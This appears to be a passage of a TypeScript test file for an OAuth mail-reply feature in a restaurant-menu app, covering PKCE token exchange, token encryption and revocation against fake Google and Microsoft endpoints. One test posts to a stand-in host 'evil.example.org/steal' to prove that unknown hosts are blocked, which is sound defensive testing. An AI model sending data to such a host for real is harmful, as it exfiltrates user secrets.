/// <reference types="vite/client" />

// ScanMe Menu V1 — K26: the reply to a guest, the LIVE side (master §11.4; plan
// docs/meni/planovi/K24.md §3): `completeConnect` (the OAuth callback step),
// `sendReply` (a reply from the venue's mailbox to the reservation's own guest
// address) and the best-effort `revokeAtProvider`, with the connection they
// store. The settings/panel functions are in convex/menuMail.test.ts.
//
// Every provider call goes to a FAKE `fetch` that answers only the six hosts the
// feature may talk to (Google token/revoke, Google userinfo, Gmail send,
// Microsoft token, Microsoft userinfo, Graph sendMail) and answers 599 (and
// records the host) for any other: afterEach asserts nothing was ever refused,
// so no real call can leave the process. The fake checks what a real provider
// checks: the client id and secret, the redirect URI, the PKCE verifier against
// the challenge of the authorize URL, the current refresh token (Microsoft
// ROTATES it on every refresh) and a currently valid access token on the mail
// API.
//
// Time is frozen (fake timers, T0 = Wednesday 2026-10-21 10:00 Belgrade); the
// clock moves with vi.setSystemTime. Fictional data only (the repo is public).
// All tokens, codes and keys below are TEST values. The helpers are copied from
// convex/menuReservationsPanel.test.ts on purpose (a test file is not a module
// to import from).

import rateLimiterTest from "@convex-dev/rate-limiter/test";
import { convexTest } from "convex-test";
import type { FunctionArgs } from "convex/server";
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { api } from "./_generated/api";
import type { Id, TableNames } from "./_generated/dataModel";
import schema from "./schema";
import * as menuMailActions from "./menuMailActions";
import { bytesToBase64, decodeAdminMailKey, sha256Hex } from "./lib/adminMailCrypto";
import { MENU_MAIL_KEY_VERSION, menuMailAad, openMenuMailSecret } from "./lib/menuMailCrypto";
import { rateLimiter } from "./lib/rateLimits";
import { MAIL_ERROR } from "../lib/menu/errors/mail";
import { RESERVATION_ERROR } from "../lib/menu/errors/reservations";
import { STAFF_ERROR } from "../lib/menu/errors/waiter";
import { codeChallengeS256 } from "../lib/menu/mail/pkce";
import { newMenuToken } from "../lib/menu/tokens";
import { belgradeLocalToEpoch } from "../lib/belgrade-time";
import { SLUG_A, SLUG_B, TEST_ADMIN_EMAIL, TEST_ISSUER, seedMenuWorld, type MenuTenantSeed, type MenuWorldSeed } from "../lib/menu/testkit/seed";

const modules = import.meta.glob("./**/*.ts");

// TEST key: bytes 1..32. Never a real value.
const TEST_KEY = bytesToBase64(Uint8Array.from({ length: 32 }, (_, index) => index + 1));
const KEY = must(decodeAdminMailKey(TEST_KEY), "the test key");
const REDIRECT = "http://localhost:3170/api/meni/mail/callback";
const ADDRESS = "rezervacije@demo.example";
const GUEST = "gost@example.com";
const GOOGLE = { id: "test-google-client-id", secret: "test-google-client-secret" };
const MICROSOFT = { id: "test-microsoft-client-id", secret: "test-microsoft-client-secret" };
const CODE = "test-code-1";
const SUBJECT = "Rezervacija je potvrđena";
const BODY = "Dobar dan, Marija,\n\nčćžšđ ČĆŽŠĐ";

const ENV_NAMES = [
  "MENU_MAIL_ENABLED",
  "MENU_MAIL_TOKEN_KEY",
  "MENU_MAIL_REDIRECT_URI",
  "MENU_MAIL_GOOGLE_CLIENT_ID",
  "MENU_MAIL_GOOGLE_CLIENT_SECRET",
  "MENU_MAIL_MICROSOFT_CLIENT_ID",
  "MENU_MAIL_MICROSOFT_CLIENT_SECRET",
] as const;
type EnvName = (typeof ENV_NAMES)[number];

/** The complete configuration; an override of `undefined` removes the variable. */
function mailEnv(overrides: Partial<Record<EnvName, string | undefined>> = {}) {
  const values: Record<EnvName, string | undefined> = {
    MENU_MAIL_ENABLED: "true",
    MENU_MAIL_TOKEN_KEY: TEST_KEY,
    MENU_MAIL_REDIRECT_URI: REDIRECT,
    MENU_MAIL_GOOGLE_CLIENT_ID: GOOGLE.id,
    MENU_MAIL_GOOGLE_CLIENT_SECRET: GOOGLE.secret,
    MENU_MAIL_MICROSOFT_CLIENT_ID: MICROSOFT.id,
    MENU_MAIL_MICROSOFT_CLIENT_SECRET: MICROSOFT.secret,
    ...overrides,
  };
  for (const name of ENV_NAMES) {
    const value = values[name];
    if (value === undefined) delete process.env[name];
    else process.env[name] = value;
  }
}

// -----------------------------------------------------------------------------
// The fake providers
// -----------------------------------------------------------------------------

const GOOGLE_SCOPE = "openid https://www.googleapis.com/auth/gmail.send https://www.googleapis.com/auth/userinfo.email";
const MICROSOFT_SCOPE = "openid email offline_access https://graph.microsoft.com/Mail.Send";
const HOST_GOOGLE_TOKEN = "oauth2.googleapis.com";
const HOST_GOOGLE_USERINFO = "openidconnect.googleapis.com";
const HOST_GMAIL = "gmail.googleapis.com";
const HOST_MS_TOKEN = "login.microsoftonline.com";
const HOST_GRAPH = "graph.microsoft.com";
const MS_TOKEN_PATH = "/common/oauth2/v2.0/token";
const GMAIL_SEND_PATH = "/gmail/v1/users/me/messages/send";
const GRAPH_SEND_PATH = "/v1.0/me/sendMail";

type Call = { method: string; url: URL; headers: Headers; body: string };

function fakeProviders() {
  const calls: Call[] = [];
  /** Hosts the fake refused (anything outside the six). Must stay empty. */
  const refused: string[] = [];
  const state = {
    /** The code_challenge of the latest authorize URL (the fake checks the verifier against it). */
    challenge: "",
    /** Every code_verifier that reached a token endpoint. */
    verifiers: [] as string[],
    email: ADDRESS,
    emailVerified: true,
    googleScope: GOOGLE_SCOPE,
    refreshRejected: false,
    down: false,
    /** Every mail send answers 401, even with a fresh token. */
    sendUnauthorized: false,
    /** Force an HTTP status on the mail send endpoints (once). */
    sendStatus: null as number | null,
    refreshToken: { google: "", microsoft: "" },
    counters: { google: { access: 0, refresh: 0 }, microsoft: { access: 0, refresh: 0 } },
    validAccess: new Set<string>(),
    /** The base64url `raw` of every Gmail send. */
    sentRaw: [] as string[],
    /** The JSON of every Graph sendMail. */
    sentGraph: [] as unknown[],
  };
  const respond = (body: unknown, status = 200) =>
    new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });

  async function token(form: URLSearchParams, who: "google" | "microsoft") {
    const client = who === "google" ? GOOGLE : MICROSOFT;
    const prefix = who === "google" ? "g" : "m";
    if (form.get("client_id") !== client.id || form.get("client_secret") !== client.secret) return respond({ error: "invalid_client" }, 401);
    const issue = () => {
      const value = `${prefix}-access-${++state.counters[who].access}`;
      state.validAccess.add(value);
      return value;
    };
    const grant = form.get("grant_type");
    if (grant === "authorization_code") {
      const verifier = form.get("code_verifier") ?? "";
      state.verifiers.push(verifier);
      if (form.get("code") !== CODE || form.get("redirect_uri") !== REDIRECT) return respond({ error: "invalid_grant" }, 400);
      if ((await codeChallengeS256(verifier)) !== state.challenge) return respond({ error: "invalid_grant" }, 400);
      state.refreshToken[who] = `${prefix}-refresh-${++state.counters[who].refresh}`;
      return respond({
        access_token: issue(),
        refresh_token: state.refreshToken[who],
        expires_in: 3599,
        scope: who === "google" ? state.googleScope : MICROSOFT_SCOPE,
      });
    }
    if (grant === "refresh_token") {
      if (state.refreshRejected || form.get("refresh_token") !== state.refreshToken[who]) return respond({ error: "invalid_grant" }, 400);
      if (who === "google") return respond({ access_token: issue(), expires_in: 3599, scope: GOOGLE_SCOPE });
      // Microsoft rotates: the old refresh token stops working.
      state.refreshToken.microsoft = `m-refresh-${++state.counters.microsoft.refresh}`;
      return respond({ access_token: issue(), refresh_token: state.refreshToken.microsoft, expires_in: 3599, scope: MICROSOFT_SCOPE });
    }
    return respond({ error: "unsupported_grant_type" }, 400);
  }

  const fetchMock = vi.fn(async (input: RequestInfo | URL, init: RequestInit = {}) => {
    const url = new URL(typeof input === "string" ? input : input instanceof URL ? input.href : input.url);
    const method = init.method ?? "GET";
    const headers = new Headers(init.headers);
    const body = typeof init.body === "string" ? init.body : "";
    calls.push({ method, url, headers, body });

    const known = [HOST_GOOGLE_TOKEN, HOST_GOOGLE_USERINFO, HOST_GMAIL, HOST_MS_TOKEN, HOST_GRAPH];
    if (!known.includes(url.host)) {
      refused.push(url.host);
      return new Response(null, { status: 599 });
    }
    if (state.down) throw new TypeError("TEST network down");

    const bearer = headers.get("Authorization")?.replace(/^Bearer /, "") ?? "";
    const authorized = state.validAccess.has(bearer);
    const forced = state.sendStatus;

    if (url.host === HOST_GOOGLE_TOKEN) {
      if (url.pathname === "/revoke") return new Response(null, { status: 200 });
      if (url.pathname === "/token" && method === "POST") return await token(new URLSearchParams(body), "google");
    }
    if (url.host === HOST_GOOGLE_USERINFO && url.pathname === "/v1/userinfo") {
      if (!authorized) return respond({}, 401);
      return respond({ email: state.email, email_verified: state.emailVerified });
    }
    if (url.host === HOST_GMAIL && url.pathname === GMAIL_SEND_PATH && method === "POST") {
      if (forced !== null) {
        state.sendStatus = null;
        return respond({}, forced);
      }
      if (!authorized || state.sendUnauthorized) return respond({ error: "unauthorized" }, 401);
      state.sentRaw.push((JSON.parse(body) as { raw: string }).raw);
      return respond({ id: "msg123" });
    }
    if (url.host === HOST_MS_TOKEN && url.pathname === MS_TOKEN_PATH && method === "POST") {
      return await token(new URLSearchParams(body), "microsoft");
    }
    if (url.host === HOST_GRAPH && url.pathname === "/oidc/userinfo") {
      if (!authorized) return respond({}, 401);
      return respond({ email: state.email });
    }
    if (url.host === HOST_GRAPH && url.pathname === GRAPH_SEND_PATH && method === "POST") {
      if (forced !== null) {
        state.sendStatus = null;
        return respond({}, forced);
      }
      if (!authorized || state.sendUnauthorized) return respond({ error: "unauthorized" }, 401);
      state.sentGraph.push(JSON.parse(body));
      return new Response(null, { status: 202 });
    }
    return respond({}, 404);
  });

  const callsTo = (host: string, path?: string) => calls.filter((call) => call.url.host === host && (path === undefined || call.url.pathname === path));
  const form = (call: Call) => new URLSearchParams(call.body);
  return { fetchMock, calls, refused, state, callsTo, form };
}

let fake: ReturnType<typeof fakeProviders>;

beforeEach(() => {
  process.env.SCANME_ADMIN_EMAILS = TEST_ADMIN_EMAIL;
  process.env.MENU_PIN_PEPPER = "test-pepper-0123456789abcdef";
  fake = fakeProviders();
  vi.stubGlobal("fetch", fake.fetchMock);
  mailEnv();
});

afterEach(() => {
  // The fake refuses every host outside the six; nothing in any test may have reached one.
  expect(fake.refused).toEqual([]);
  for (const name of ENV_NAMES) delete process.env[name];
  delete process.env.MENU_PIN_PEPPER;
  vi.unstubAllGlobals();
  vi.useRealTimers();
});

// -----------------------------------------------------------------------------
// MIME of the Gmail send (decoded with Web APIs only: the test runtime has no Buffer)
// -----------------------------------------------------------------------------

function fromBase64(value: string): string {
  return new TextDecoder().decode(Uint8Array.from(atob(value), (character) => character.charCodeAt(0)));
}

function fromBase64Url(value: string): string {
  const standard = value.replace(/-/g, "+").replace(/_/g, "/");
  return fromBase64(standard + "=".repeat((4 - (standard.length % 4)) % 4));
}

function decodeWords(value: string): string {
  const words = [...value.matchAll(/=\?UTF-8\?B\?([^?]*)\?=/g)];
  return words.length > 0 ? words.map((word) => fromBase64(word[1])).join("") : value;
}

function parseMime(raw: string) {
  const mime = fromBase64Url(raw);
  const [head, ...rest] = mime.split("\r\n\r\n");
  const headers: Record<string, string> = {};
  for (const line of head.replace(/\r\n[ \t]+/g, " ").split("\r\n")) {
    const colon = line.indexOf(":");
    headers[line.slice(0, colon).toLowerCase()] = line.slice(colon + 1).trim();
  }
  return { mime, headers, subject: decodeWords(headers.subject ?? ""), body: fromBase64(rest.join("\r\n\r\n").replace(/\r\n/g, "")).replace(/\r\n/g, "\n") };
}

// -----------------------------------------------------------------------------
// World, staff, the guest's request
// -----------------------------------------------------------------------------

const newTest = () => {
  const t = convexTest(schema, modules);
  rateLimiterTest.register(t);
  return t;
};
type T = ReturnType<typeof newTest>;
type Caller = Pick<T, "query" | "mutation" | "action">;

function as(t: T, userId: Id<"users">) {
  return t.withIdentity({ subject: userId, issuer: TEST_ISSUER });
}

function must<V>(value: V | null | undefined, what = "value"): V {
  if (value === null || value === undefined) throw new Error(`expected ${what}, got ${String(value)}`);
  return value;
}

const T0 = Date.UTC(2026, 9, 21, 8, 0, 0); // Wednesday 10:00 in Belgrade (CEST)
const MINUTE = 60_000;
const HOUR = 60 * MINUTE;
const THU_19 = must(belgradeLocalToEpoch("2026-10-22T19:00"), "a Belgrade time");

const DAILY = [{ start: 12 * 60, end: 23 * 60 }];
const LATE = [{ start: 12 * 60, end: 25 * 60 }];
const WEEK = { days: [DAILY, DAILY, DAILY, DAILY, LATE, LATE, DAILY] };

/** Well-formed (43 url-safe characters), but nobody's session token. */
const BOGUS_TOKEN = "A".repeat(43);

async function world() {
  vi.useFakeTimers();
  vi.setSystemTime(T0);
  const t = newTest();
  const w: MenuWorldSeed = await t.run(async (ctx) => await seedMenuWorld(ctx));
  const owner = as(t, w.ownerId);
  const { code } = await owner.mutation(api.menuStaff.ensurePanelCode, { menuServiceId: w.a.menuServiceId });
  const other = as(t, w.otherOwnerId);
  const { code: bCode } = await other.mutation(api.menuStaff.ensurePanelCode, { menuServiceId: w.b.menuServiceId });
  return { t, w, owner, code, bCode };
}
type Env = Awaited<ReturnType<typeof world>>;
type Venue = "a" | "b";

/** The working hours, then the ScanMe form, for venue a. */
async function openForm(env: Env, contact: "email" | "phone" | "both" = "both") {
  await env.owner.mutation(api.menuSettings.setWorkingHours, { menuServiceId: env.w.a.menuServiceId, workingHours: WEEK });
  const outcome = await env.owner.mutation(api.menuServices.setReservations, { menuServiceId: env.w.a.menuServiceId, mode: "form", contact });
  if (!outcome.ok) throw new Error(`setReservations refused: ${JSON.stringify(outcome)}`);
}

async function addStaff(env: Env, displayName: string, pin: string, venue: Venue = "a") {
  const b = venue === "b";
  const who = b ? as(env.t, env.w.otherOwnerId) : env.owner;
  const { staffId } = await who.mutation(api.menuStaff.create, { menuServiceId: b ? env.w.b.menuServiceId : env.w.a.menuServiceId, displayName });
  await who.mutation(api.menuStaff.setPin, { staffId, pin });
  return staffId;
}

function panel(env: Env, sessionToken?: string, venue: Venue = "a") {
  return {
    slug: venue === "b" ? SLUG_B : SLUG_A,
    panelCode: venue === "b" ? env.bCode : env.code,
    ...(sessionToken !== undefined ? { sessionToken } : {}),
  };
}

/** A PIN waiter, created and signed in. */
async function signedIn(env: Env, displayName: string, pin: string, venue: Venue = "a") {
  const staffId = await addStaff(env, displayName, pin, venue);
  const { slug, panelCode } = panel(env, undefined, venue);
  const outcome = await env.t.mutation(api.menuWaiter.loginWithPin, { slug, panelCode, pin });
  if (!outcome.ok) throw new Error(`sign-in refused: ${JSON.stringify(outcome)}`);
  return { staffId, token: outcome.sessionToken };
}

type SubmitArgs = FunctionArgs<typeof api.menuReservations.submit>;

let seq = 0;
const ipOf = (n: number) => n.toString(16).padStart(32, "0");

/** A valid request of a fresh device (with gost@example.com as the contact). */
async function guestRequest(env: Env, overrides: Partial<SubmitArgs> = {}) {
  seq += 1;
  const args: SubmitArgs = {
    slug: SLUG_A,
    deviceToken: newMenuToken(),
    clientRequestId: `req-${String(seq).padStart(8, "0")}`,
    cancelToken: newMenuToken(),
    guestName: "Marija Gost",
    partySize: 4,
    requestedAt: THU_19,
    contactEmail: GUEST,
    contactPhone: "+381 60 000 0000",
    ipHash: ipOf(seq),
    ...overrides,
  };
  const result = await env.t.mutation(api.menuReservations.submit, args);
  if (!result.ok) throw new Error(`submit refused: ${JSON.stringify(result)}`);
  return { args, reservationId: result.reservationId };
}

/** A reservation of another venue, written straight into the table. */
async function putReservation(env: Env, tenant: MenuTenantSeed) {
  seq += 1;
  return await env.t.run(
    async (ctx) =>
      await ctx.db.insert("menuReservations", {
        menuServiceId: tenant.menuServiceId,
        businessId: tenant.businessId,
        status: "new",
        guestName: "Gost iz drugog lokala",
        partySize: 2,
        requestedAt: THU_19,
        contactEmail: GUEST,
        cancelTokenHash: `seeded-hash-${seq}`,
        deviceKeyHash: `seeded-device-${seq}`,
        createdAt: T0,
        updatedAt: T0,
      }),
  );
}

const connectionRows = (env: Env) => env.t.run(async (ctx) => await ctx.db.query("menuMailConnections").take(100));
const stateRows = (env: Env) => env.t.run(async (ctx) => await ctx.db.query("menuMailOAuthStates").take(100));
const replyRows = (env: Env) => env.t.run(async (ctx) => await ctx.db.query("menuReservationReplies").take(100));
const auditRows = async (env: Env, action: string) =>
  (await env.t.run(async (ctx) => await ctx.db.query("menuAuditLog").take(5000))).filter((row) => row.action === action);

/** Every row of every table of the schema, for "this text is stored nowhere" checks. */
const everything = (env: Env) =>
  env.t.run(async (ctx) => {
    const out: Record<string, unknown[]> = {};
    for (const table of Object.keys(schema.tables)) out[table] = await ctx.db.query(table as TableNames).take(2000);
    return out;
  });

// -----------------------------------------------------------------------------
// Connecting and sending
// -----------------------------------------------------------------------------

type Provider = "gmail" | "microsoft";

/** startConnect, and the part of the authorize URL the browser would return to us. */
async function begin(env: Env, provider: Provider, who: Caller = env.owner) {
  const started = await who.mutation(api.menuMail.startConnect, { menuServiceId: env.w.a.menuServiceId, provider });
  if (!started.ok) throw new Error(`startConnect refused: ${started.code}`);
  const url = new URL(started.authorizeUrl);
  const state = must(url.searchParams.get("state"), "the state");
  const challenge = must(url.searchParams.get("code_challenge"), "the challenge");
  fake.state.challenge = challenge;
  return { url, state, challenge };
}

const complete = (state: string, who: Caller, code = CODE) => who.action(api.menuMailActions.completeConnect, { code, state });

/** The whole OAuth flow of the Owner; throws if it does not end connected. */
async function connect(env: Env, provider: Provider, who: Caller = env.owner) {
  const flow = await begin(env, provider, who);
  const outcome = await complete(flow.state, who);
  if (!outcome.ok) throw new Error(`completeConnect refused: ${outcome.code}`);
  return { ...flow, outcome };
}

let sendSeq = 0;
const nextSendId = () => `send-${String(++sendSeq).padStart(8, "0")}`;

type SendOpts = { who?: Caller; token?: string; venue?: Venue; kind?: "accept" | "decline" | "propose" | "other"; subject?: string; body?: string; clientSendId?: string };

const send = (env: Env, reservationId: Id<"menuReservations">, o: SendOpts = {}) =>
  (o.who ?? env.owner).action(api.menuMailActions.sendReply, {
    ...panel(env, o.token, o.venue),
    reservationId,
    kind: o.kind ?? "accept",
    subject: o.subject ?? SUBJECT,
    body: o.body ?? BODY,
    clientSendId: o.clientSendId ?? nextSendId(),
  });

/** A connected venue with one reservation of gost@example.com. */
async function ready(provider: Provider = "gmail", contact: "email" | "phone" | "both" = "both") {
  const env = await world();
  await openForm(env, contact);
  const flow = await connect(env, provider);
  const { reservationId } = await guestRequest(env);
  return { env, reservationId, flow };
}

async function storedSecret(env: Env, which: "refresh" | "access", provider: Provider) {
  const row = must((await connectionRows(env))[0], "the connection row");
  const ciphertext = which === "refresh" ? row.refreshTokenCiphertext : row.accessTokenCiphertext;
  const iv = which === "refresh" ? row.refreshTokenIv : row.accessTokenIv;
  return await openMenuMailSecret(
    KEY,
    { ciphertext: must(ciphertext, `${which} ciphertext`), iv: must(iv, `${which} iv`) },
    menuMailAad({ purpose: which, menuServiceId: env.w.a.menuServiceId, provider, binding: ADDRESS }),
  );
}

const gmailSends = () => fake.callsTo(HOST_GMAIL, GMAIL_SEND_PATH);
const graphSends = () => fake.callsTo(HOST_GRAPH, GRAPH_SEND_PATH);
const googleTokenCalls = () => fake.callsTo(HOST_GOOGLE_TOKEN, "/token");
const microsoftTokenCalls = () => fake.callsTo(HOST_MS_TOKEN, MS_TOKEN_PATH);

/** Everything wrong with a public answer: a token-like key, or any secret string inside. */
function leaksIn(value: unknown, secrets: string[]): string[] {
  const problems: string[] = [];
  const walk = (node: unknown, path: string) => {
    if (typeof node === "string") {
      for (const secret of secrets) if (secret && node.includes(secret)) problems.push(`${path} contains a secret`);
    } else if (Array.isArray(node)) {
      node.forEach((item, index) => walk(item, `${path}[${index}]`));
    } else if (node && typeof node === "object") {
      for (const [key, item] of Object.entries(node)) {
        if (/ciphertext|iv$|token/i.test(key)) problems.push(`${path}.${key} looks like a secret`);
        walk(item, `${path}.${key}`);
      }
    }
  };
  walk(value, "$");
  return problems;
}

// -----------------------------------------------------------------------------
// 0. The fake itself
// -----------------------------------------------------------------------------

describe("the fake providers", () => {
  test("a host outside the six is refused with 599 and recorded; nothing real can leave", async () => {
    const response = await fetch("https://evil.example.org/steal", { method: "POST", body: "x" });
    expect(response.status).toBe(599);
    expect(fake.refused).toEqual(["evil.example.org"]);
    fake.refused.length = 0; // expected here, so afterEach stays strict everywhere else
  });
});

// -----------------------------------------------------------------------------
// 1. Without the keys
// -----------------------------------------------------------------------------

describe("without the configuration", () => {
  test.each([
    ["the switch is missing", { MENU_MAIL_ENABLED: undefined }],
    ["the key is 31 bytes", { MENU_MAIL_TOKEN_KEY: bytesToBase64(Uint8Array.from({ length: 31 }, (_, index) => index + 1)) }],
    ["the redirect URI is not the callback path", { MENU_MAIL_REDIRECT_URI: "http://localhost:3170/somewhere/else" }],
    ["no variable at all", Object.fromEntries(ENV_NAMES.map((name) => [name, undefined]))],
  ] as const)("%s: completeConnect and sendReply say not_configured and change nothing", async (_name, overrides) => {
    const { env, reservationId, flow } = await ready();
    mailEnv(overrides);
    fake.calls.length = 0;
    expect(await complete(flow.state, env.owner)).toEqual({ ok: false, code: MAIL_ERROR.notConfigured, slug: null });
    expect(await send(env, reservationId)).toEqual({ ok: false, code: MAIL_ERROR.notConfigured });
    expect(await replyRows(env)).toEqual([]);
    expect(fake.calls).toEqual([]);
  });

  test("a state left over from before the switch was turned off is not consumed by the refusal", async () => {
    const env = await world();
    const flow = await begin(env, "gmail");
    mailEnv({ MENU_MAIL_ENABLED: undefined });
    expect(await complete(flow.state, env.owner)).toMatchObject({ ok: false, code: MAIL_ERROR.notConfigured });
    expect((await stateRows(env))[0].usedAt).toBeUndefined();
    expect(fake.calls).toEqual([]);
    // Turned on again, the same link still works.
    mailEnv();
    expect(await complete(flow.state, env.owner)).toMatchObject({ ok: true });
  });
});

// -----------------------------------------------------------------------------
// 2. The OAuth flow
// -----------------------------------------------------------------------------

describe("completeConnect", () => {
  test.each([
    ["gmail", HOST_GOOGLE_TOKEN],
    ["microsoft", HOST_MS_TOKEN],
  ] as const)("%s: the code is exchanged with the PKCE verifier, the address comes from userinfo and the status shows the connection", async (provider, host) => {
    const env = await world();
    const flow = await begin(env, provider);
    const outcome = await complete(flow.state, env.owner);
    expect(outcome).toEqual({ ok: true, slug: SLUG_A, emailAddress: ADDRESS });

    // The token request: our client, the exact redirect URI, the code, and the verifier of THIS challenge.
    const exchange = (provider === "gmail" ? googleTokenCalls() : microsoftTokenCalls())[0];
    expect(exchange.url.host).toBe(host);
    const body = fake.form(exchange);
    const client = provider === "gmail" ? GOOGLE : MICROSOFT;
    expect(body.get("grant_type")).toBe("authorization_code");
    expect(body.get("code")).toBe(CODE);
    expect(body.get("client_id")).toBe(client.id);
    expect(body.get("client_secret")).toBe(client.secret);
    expect(body.get("redirect_uri")).toBe(REDIRECT);
    const verifier = must(body.get("code_verifier"), "the code_verifier");
    expect(await codeChallengeS256(verifier)).toBe(flow.challenge);
    expect(fake.state.verifiers).toEqual([verifier]);

    // The address is the one userinfo says, read with the new access token.
    const userinfo = provider === "gmail" ? fake.callsTo(HOST_GOOGLE_USERINFO, "/v1/userinfo") : fake.callsTo(HOST_GRAPH, "/oidc/userinfo");
    expect(userinfo).toHaveLength(1);
    expect(userinfo[0].headers.get("Authorization")).toBe(`Bearer ${provider === "gmail" ? "g" : "m"}-access-1`);

    const status = must(await env.owner.query(api.menuMail.status, { menuServiceId: env.w.a.menuServiceId }));
    expect(status.connection).toEqual({ provider, emailAddress: ADDRESS, status: "active", connectedAt: T0, lastErrorCode: null });

    const rows = await connectionRows(env);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({
      menuServiceId: env.w.a.menuServiceId,
      provider,
      emailAddress: ADDRESS,
      status: "active",
      keyVersion: MENU_MAIL_KEY_VERSION,
      connectedByUserId: env.w.ownerId,
      connectedAt: T0,
      accessTokenExpiresAt: T0 + 3_599_000,
    });
    expect(rows[0].scopes.join(" ")).toBe(provider === "gmail" ? "openid email https://www.googleapis.com/auth/gmail.send" : MICROSOFT_SCOPE);
    expect(await auditRows(env, "mail.connected")).toHaveLength(1);
  });

  test("the state is one-time: a second use is mail/state_invalid and the provider is not called again", async () => {
    const env = await world();
    const flow = await begin(env, "gmail");
    expect(await complete(flow.state, env.owner)).toMatchObject({ ok: true });
    const tokenCalls = fake.calls.length;
    expect(await complete(flow.state, env.owner)).toEqual({ ok: false, code: MAIL_ERROR.stateInvalid, slug: SLUG_A });
    expect(fake.calls).toHaveLength(tokenCalls);
    expect((await stateRows(env))[0].usedAt).toBe(T0);
  });

  test("the state expires after 10 minutes (at the instant itself, not only after)", async () => {
    const env = await world();
    const stale = await begin(env, "gmail");
    vi.setSystemTime(T0 + 10 * MINUTE);
    expect(await complete(stale.state, env.owner)).toEqual({ ok: false, code: MAIL_ERROR.stateInvalid, slug: SLUG_A });
    expect(fake.calls).toEqual([]);

    // A fresh state works until its own last millisecond.
    const fresh = await begin(env, "gmail");
    vi.setSystemTime(T0 + 20 * MINUTE - 1);
    expect(await complete(fresh.state, env.owner)).toMatchObject({ ok: true });
  });

  test("another person (also allowed to change settings) cannot use the Owner's state; it stays usable by the Owner", async () => {
    const env = await world();
    const flow = await begin(env, "gmail");
    const manager = as(env.t, env.w.managerId);
    expect(await complete(flow.state, manager)).toEqual({ ok: false, code: MAIL_ERROR.stateInvalid, slug: null });
    expect(await complete(flow.state, env.t)).toEqual({ ok: false, code: MAIL_ERROR.stateInvalid, slug: null });
    expect(await complete(flow.state, as(env.t, env.w.otherOwnerId))).toEqual({ ok: false, code: MAIL_ERROR.stateInvalid, slug: null });
    expect(await complete(flow.state, as(env.t, env.w.editorId))).toEqual({ ok: false, code: MAIL_ERROR.stateInvalid, slug: null });
    expect(fake.calls).toEqual([]);
    expect(await connectionRows(env)).toEqual([]);
    expect((await stateRows(env))[0].usedAt).toBeUndefined();
    expect(await complete(flow.state, env.owner)).toMatchObject({ ok: true });
  });

  test("an unknown or malformed state is mail/state_invalid with no slug and no network", async () => {
    const env = await world();
    await begin(env, "gmail");
    for (const state of ["A".repeat(43), "short", "has spaces in it, not a state at all!", ""]) {
      expect(await complete(state, env.owner)).toEqual({ ok: false, code: MAIL_ERROR.stateInvalid, slug: null });
    }
    expect(fake.calls).toEqual([]);
  });

  test("a code the provider rejects is mail/state_invalid (connect again), a provider that is down is mail/provider_unavailable; nothing is stored", async () => {
    const env = await world();
    const rejected = await begin(env, "gmail");
    expect(await complete(rejected.state, env.owner, "wrong-code")).toEqual({ ok: false, code: MAIL_ERROR.stateInvalid, slug: SLUG_A });

    const down = await begin(env, "microsoft");
    fake.state.down = true;
    expect(await complete(down.state, env.owner)).toEqual({ ok: false, code: MAIL_ERROR.providerUnavailable, slug: SLUG_A });
    expect(await connectionRows(env)).toEqual([]);
    expect(await auditRows(env, "mail.connected")).toEqual([]);
  });

  test("a code with characters that cannot be a code never reaches the provider", async () => {
    const env = await world();
    const flow = await begin(env, "gmail");
    expect(await complete(flow.state, env.owner, "not a code")).toEqual({ ok: false, code: MAIL_ERROR.providerUnavailable, slug: SLUG_A });
    expect(fake.calls).toEqual([]);
  });

  test("a Google grant without the gmail.send scope is mail/scope_missing: nothing stored, the refresh token revoked", async () => {
    const env = await world();
    fake.state.googleScope = "openid https://www.googleapis.com/auth/userinfo.email";
    const flow = await begin(env, "gmail");
    expect(await complete(flow.state, env.owner)).toEqual({ ok: false, code: MAIL_ERROR.scopeMissing, slug: SLUG_A });
    expect(await connectionRows(env)).toEqual([]);
    expect(await auditRows(env, "mail.connected")).toEqual([]);
    const revokes = fake.callsTo(HOST_GOOGLE_TOKEN, "/revoke");
    expect(revokes).toHaveLength(1);
    expect(fake.form(revokes[0]).get("token")).toBe("g-refresh-1");
    // The address was not even asked for.
    expect(fake.callsTo(HOST_GOOGLE_USERINFO)).toEqual([]);
  });

  test("an address the provider does not verify is not stored and the grant is revoked", async () => {
    const env = await world();
    fake.state.emailVerified = false;
    const flow = await begin(env, "gmail");
    expect(await complete(flow.state, env.owner)).toEqual({ ok: false, code: MAIL_ERROR.providerUnavailable, slug: SLUG_A });
    expect(await connectionRows(env)).toEqual([]);
    expect(fake.form(fake.callsTo(HOST_GOOGLE_TOKEN, "/revoke")[0]).get("token")).toBe("g-refresh-1");
  });

  test("connecting a different mailbox replaces the one connection and revokes the old grant; the same mailbox does not", async () => {
    const env = await world();
    await connect(env, "gmail");
    await connect(env, "gmail"); // the same mailbox again
    await env.t.finishAllScheduledFunctions(vi.runAllTimers);
    expect(fake.callsTo(HOST_GOOGLE_TOKEN, "/revoke")).toEqual([]);

    fake.state.email = "druga@demo.example";
    await connect(env, "gmail");
    await env.t.finishAllScheduledFunctions(vi.runAllTimers);
    const revokes = fake.callsTo(HOST_GOOGLE_TOKEN, "/revoke");
    expect(revokes).toHaveLength(1);
    expect(fake.form(revokes[0]).get("token")).toBe("g-refresh-2"); // the grant that was replaced

    const rows = await connectionRows(env);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ provider: "gmail", emailAddress: "druga@demo.example", status: "active" });
    expect(await auditRows(env, "mail.connected")).toHaveLength(3);
  });
});

// -----------------------------------------------------------------------------
// 3. Encryption of what is stored
// -----------------------------------------------------------------------------

describe("what is stored", () => {
  test("no token and no verifier is in any connection or state row; only the state's hash is", async () => {
    const env = await world();
    const flow = await connect(env, "gmail");
    const dump = JSON.stringify({ connections: await connectionRows(env), states: await stateRows(env) });
    for (const secret of ["g-access-1", "g-refresh-1", fake.state.verifiers[0], flow.state]) {
      expect(dump).not.toContain(secret);
    }
    expect(dump).toContain(await sha256Hex(flow.state));
  });

  test("the ciphertexts open only with the right key and binding (purpose, venue, provider, address)", async () => {
    const env = await world();
    await connect(env, "gmail");
    const row = must((await connectionRows(env))[0]);
    expect(row.keyVersion).toBe(1);
    const refresh = { ciphertext: must(row.refreshTokenCiphertext), iv: must(row.refreshTokenIv) };
    const binding = { menuServiceId: env.w.a.menuServiceId, provider: "gmail", binding: ADDRESS };

